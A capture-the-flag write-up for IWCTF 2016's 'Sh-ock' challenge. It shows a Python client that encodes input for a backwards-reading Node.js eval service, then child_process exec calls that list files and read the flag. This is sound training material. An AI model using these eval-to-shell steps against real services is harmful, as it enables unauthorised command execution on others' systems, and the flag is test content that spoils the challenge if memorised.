# IWCTF 2016 - Exploit - Sh-ock - 90 pts

> Description: This is some kind of weird thing. I am sh-ocked.

> Service: 188.166.133.53:12589 

# Write-up

After connecting to the specified service, we'll get a prompt looking like a shell at first.

But after trying some commands, it gets obvious, that this ain't your normal shell, and it also has an awkward way of reading input.

```shell
$ nc 188.166.133.53 12589
Welcome and have fun!
$ls
[ReferenceError: l is not defined]
$abcdefg
[ReferenceError: fdb is not defined]
```

The error message reveals, that our input gets parsed backwards and it only reads every second character.

Adapting to this:

```shell
$l.a.v.e.
[Function: eval]
```

It seems to be some javascript interpreter. To make it a bit easier to communicate with the service, I wrote a (quick&dirty) python script, which reverses the input and adds the needed placeholders. It then occured, that the longer our command is, the more placeholders were needed (count of dots found by empirical analysis ;-))

```python
#!/usr/bin/python
from socket import *
import sys
import time

BANNER = "Welcome and have fun!\n"

s = None

def connect():
	global s
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(("188.166.133.53",12589))
	banner = s.recv(len(BANNER))
	print banner

def obfuscate(cmd):
	rev = cmd[::-1]
	res = ""

	for ch in rev:
		res += ch

		if len(cmd)<5:
			res += "."
		elif len(cmd)<6:
			res += ".."
		elif len(cmd)<8:
			res += "..."
		elif len(cmd)<9:
			res += "...."
		else:
			res += "....."
	
	return res

def execCmd():
	global s
	input = raw_input(prompt)
	cmd = obfuscate(input)+"\n"
	print "Cmd: %s" % cmd
	s.send(cmd)
	time.sleep(0.5)
	response = s.recv(4096)
	print "Response: %s" % response

connect()

prompt = s.recv(1)

while True:
	execCmd()
``` 

With this out of the way, we can start to find a way to exploit this thing.

```shell
$ python comm.py 
Welcome and have fun!

$sys=require('sys')
Cmd: ).....'.....s.....y.....s.....'.....(.....e.....r.....i.....u.....q.....e.....r.....=.....s.....y.....s.....

Response: { format: [Function],
  deprecate: [Function],
  debuglog: [Function],
  inspect: 
   { [Function: inspect]
[SNIP]
  _exceptionWithHostPort: [Function] }

$exec=require('child_process').exec
Cmd: c.....e.....x.....e...........).....'.....s.....s.....e.....c.....o.....r.....p....._.....d.....l.....i.....h.....c.....'.....(.....e.....r.....i.....u.....q.....e.....r.....=.....c.....e.....x.....e.....

Response: [Function]

$foo=exec("ls -la",function(error,stdout,stdin){sys.print(stdout)})
Cmd: ).....}.....).....t.....u.....o.....d.....t.....s.....(.....t.....n.....i.....r.....p...........s.....y.....s.....{.....).....n.....i.....d.....t.....s.....,.....t.....u.....o.....d.....t.....s.....,.....r.....o.....r.....r.....e.....(.....n.....o.....i.....t.....c.....n.....u.....f.....,.....".....a.....l.....-..... .....s.....l.....".....(.....c.....e.....x.....e.....=.....o.....o.....f.....

Response: ChildProcess {
  domain: null,
  _events: 
   { close: [Function: exithandler],
     error: [Function: errorhandler] },
  _eventsCount: 2,
  _maxListeners: undefined,
  _closesNeeded: 3,
  _closesGot: 0,
  connected: false,
  signalCode: null,
  exitCode: null,
  killed: false,
  spawnfile: '/bin/sh',
  _handle: Process { owner: [Circular], onexit: [Function], pid: 28225 },
  spawnargs: [ '/bin/sh', '-c', 'ls -la' ],
  pid: 28225,
[SNIP]

$foo()
Cmd: )..(..o..o..f..

Response: wHalfOpen: false,
     destroyed: false,
     bytesRead: 0,
     _bytesDispatched: 0,
     _sockname: null,
     _writev: null,
     _pendingData: null,
     _pendingEncoding: '' },
[SNIP]
       _pendingEncoding: '' } ] }
$total 16
drwxr-x---  2 root exp90 4096 Feb 21 03:23 .
drwxr-xr-x 14 root exp90 4096 Feb 11 12:19 ..
-rw-r--r--  1 root exp90   24 Feb 11 18:23 flag.txt
-rw-r--r--  1 root exp90 1011 Feb 11 18:23 task.js
[TypeError: foo is not a function]
$
```

There it is, let's grab it and finish this...

```shell
$foo=exec("cat flag.txt",function(error,stdout,stdin){sys.print(stdout)})
Cmd: ).....}.....).....t.....u.....o.....d.....t.....s.....(.....t.....n.....i.....r.....p...........s.....y.....s.....{.....).....n.....i.....d.....t.....s.....,.....t.....u.....o.....d.....t.....s.....,.....r.....o.....r.....r.....e.....(.....n.....o.....i.....t.....c.....n.....u.....f.....,.....".....t.....x.....t...........g.....a.....l.....f..... .....t.....a.....c.....".....(.....c.....e.....x.....e.....=.....o.....o.....f.....

Response: ChildProcess {
  domain: null,
[SNIP]

$foo()
Cmd: )..(..o..o..f..

Response:   allowHalfOpen: false,
     destroyed: false,
     bytesRead: 0,
[SNIP]
       _pendingEncoding: '' } ] }
$IW{Shocked-for-nothing!}[TypeError: foo is not a function]
```

Flag: `$IW{Shocked-for-nothing!}`
